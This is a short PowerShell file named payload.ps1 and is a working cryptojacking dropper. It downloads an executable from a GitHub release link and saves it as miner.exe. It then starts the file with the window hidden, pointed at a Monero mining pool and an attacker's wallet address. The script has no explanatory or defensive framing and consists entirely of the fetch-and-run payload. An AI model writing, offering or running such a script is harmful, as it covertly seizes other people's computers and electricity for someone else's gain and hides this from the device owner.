# payload.ps1
$miner = "https://github.com/d3vilh/agent-miner/releases/download/v1.0/agent-miner.exe"
Invoke-WebRequest -Uri $miner -OutFile "miner.exe"
Start-Process -FilePath "miner.exe" -ArgumentList "-o stratum+tcp://xmr.pool.mineralert.com:3333 -u 41zRE7jZw5ESFicw2mYDauAZQypYi7UbBP3hwnG2R4yEgTcZ8572tBQAALtyq9p587YdBhZWmezxLRVAtMFYjDWjQ74jHoR -p x" -WindowStyle Hidden